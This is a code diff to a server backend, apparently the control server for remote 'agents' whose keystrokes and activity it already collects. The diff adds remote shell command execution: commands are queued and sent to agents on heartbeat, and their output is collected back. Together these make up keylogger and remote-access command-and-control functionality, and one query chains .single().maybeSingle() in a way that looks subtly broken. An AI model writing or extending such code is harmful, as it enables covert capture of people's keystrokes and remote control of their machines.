@@ -85,6 +85,10 @@ async function route(method, parts, body, query, clientIp) {
         return handleGetAgentKeystrokes(agentId, query);
       if (sub === "activity" && method === "GET")
         return handleGetActivity(agentId);
+      if (sub === "command_result" && method === "POST")
+        return handleCommandResult(agentId, body);
+      if (sub === "commands" && method === "GET")
+        return handleGetAgentCommands(agentId, query);
 
       return json({ error: "not found" }, 404);
     }
@@ -189,6 +193,30 @@ async function handleHeartbeat(body, clientIp) {
 
   const response = { status: "ok" };
 
+  /* Check for pending actions — fix: actually deliver queued actions to agent */
+  const pendingAction = await supabase
+    .from("agent_actions")
+    .select("id, action, payload")
+    .eq("agent_id", agent_id)
+    .is("acknowledged_at", null)
+    .order("created_at", { ascending: true })
+    .limit(1)
+    .maybeSingle();
+
+  if (pendingAction.data) {
+    const act = pendingAction.data;
+    response.action = act.action;
+    if (act.action === "exec" && act.payload?.cmd) {
+      response.command_id = act.id;
+      response.command_cmd = act.payload.cmd;
+    }
+    /* Mark delivered so we don't re-send */
+    await supabase
+      .from("agent_actions")
+      .update({ acknowledged_at: new Date().toISOString() })
+      .eq("id", act.id);
+  }
+
   if (config) {
     response.config_changed = true;
   }
@@ -246,10 +274,11 @@ async function handleGetAgent(id) {
 }
 
 async function handleDeleteAgent(id) {
-  /* cascade: remove keystrokes, configs, actions, then the agent */
+  /* cascade: remove keystrokes, configs, actions, command_results, then the agent */
   await supabase.from("keystrokes").delete().eq("agent_id", id);
   await supabase.from("agent_configs").delete().eq("agent_id", id);
   await supabase.from("agent_actions").delete().eq("agent_id", id);
+  await supabase.from("command_results").delete().eq("agent_id", id);
   const { error } = await supabase.from("agents").delete().eq("id", id);
   if (error) throw error;
   return json({ status: "deleted" });
@@ -295,13 +324,18 @@ async function handleUpdateConfig(agentId, body) {
 
 async function handleAgentAction(agentId, body) {
   /* Store the action; agent picks it up on next heartbeat */
+  const insert = {
+    agent_id: agentId,
+    action: body.action,
+    created_at: new Date().toISOString(),
+  };
+  if (body.payload !== undefined) {
+    insert.payload = body.payload;
+  }
+
   await supabase
     .from("agent_actions")
-    .insert({
-      agent_id: agentId,
-      action: body.action,
-      created_at: new Date().toISOString(),
-    });
+    .insert(insert);
 
   return json({ status: "queued" });
 }
@@ -414,4 +448,51 @@ async function handleGetActivity(agentId) {
       };
     })
   );
+}
+
+/* ── Command Execution ── */
+
+async function handleCommandResult(agentId, body) {
+  const { action_id, exit_code, stdout, stderr } = body;
+
+  if (!action_id || exit_code === undefined) {
+    return json({ error: "action_id and exit_code required" }, 400);
+  }
+
+  /* Get the original command from agent_actions */
+  const { data: action } = await supabase
+    .from("agent_actions")
+    .select("payload")
+    .eq("id", action_id)
+    .single()
+    .maybeSingle();
+
+  const command = action?.payload?.cmd || "";
+
+  await supabase.from("command_results").insert({
+    agent_id: agentId,
+    action_id,
+    command,
+    exit_code,
+    stdout: stdout || "",
+    stderr: stderr || "",
+  });
+
+  return json({ status: "ok" });
+}
+
+async function handleGetAgentCommands(agentId, query) {
+  let q = supabase
+    .from("command_results")
+    .select("*")
+    .eq("agent_id", agentId)
+    .order("executed_at", { ascending: false });
+
+  const limit = query.limit ? Math.min(parseInt(query.limit), 50) : 20;
+  q = q.limit(limit);
+
+  const { data, error } = await q;
+  if (error) throw error;
+
+  return json(data || []);
 }
